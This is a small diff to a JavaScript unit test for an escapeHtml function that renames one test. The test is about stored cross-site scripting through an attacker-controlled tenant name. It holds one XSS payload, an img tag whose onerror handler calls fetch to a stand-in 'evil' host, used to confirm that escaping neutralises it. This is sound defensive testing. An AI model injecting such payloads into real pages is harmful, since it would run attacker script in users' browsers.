@@ -17,7 +17,7 @@ test('escapeHtml neutralises every HTML-significant character', () => {
   assert.equal(escapeHtml("it's"), 'it&#39;s');
 });
 
-test('escapeHtml defuses the stored-XSS payloads that reach Firestore', () => {
+test('escapeHtml defuses stored-XSS payloads that reach the UI', () => {
   // A tenant name is attacker-controllable via the admin form.
   const payload = '<img src=x onerror=fetch("//evil")>';
   assert.ok(!escapeHtml(payload).includes('<img'));
